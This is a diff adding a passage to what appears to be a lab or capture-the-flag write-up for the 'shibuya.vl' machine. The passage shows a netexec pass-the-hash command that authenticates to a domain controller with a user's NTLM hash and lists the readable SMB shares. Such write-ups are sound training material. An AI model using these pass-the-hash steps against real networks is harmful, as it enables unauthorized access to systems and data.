@@ -273,6 +273,21 @@ SMB         10.129.234.42   445    AWSJPDC0522      [+] shibuya.vl\Simon.Watson:
 ```
 Found that the hash for the operator is the hash for `simon.watson`
 
+```python
+nxc smb AWSJPDC0522.shibuya.vl -u simon.watson -H '5d8c3d1a20bd63f60f469f6763ca0d50' --shares
+SMB         10.129.234.42   445    AWSJPDC0522      [*] Windows Server 2022 Build 20348 x64 (name:AWSJPDC0522) (domain:shibuya.vl) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.129.234.42   445    AWSJPDC0522      [+] shibuya.vl\simon.watson:5d8c3d1a20bd63f60f469f6763ca0d50 
+SMB         10.129.234.42   445    AWSJPDC0522      [*] Enumerated shares
+SMB         10.129.234.42   445    AWSJPDC0522      Share           Permissions     Remark
+SMB         10.129.234.42   445    AWSJPDC0522      -----           -----------     ------
+SMB         10.129.234.42   445    AWSJPDC0522      ADMIN$                          Remote Admin
+SMB         10.129.234.42   445    AWSJPDC0522      C$                              Default share
+SMB         10.129.234.42   445    AWSJPDC0522      images$         READ            
+SMB         10.129.234.42   445    AWSJPDC0522      IPC$            READ            Remote IPC
+SMB         10.129.234.42   445    AWSJPDC0522      NETLOGON        READ            Logon server share 
+SMB         10.129.234.42   445    AWSJPDC0522      SYSVOL          READ            Logon server share 
+SMB         10.129.234.42   445    AWSJPDC0522      users           READ 
+```
 
 
 
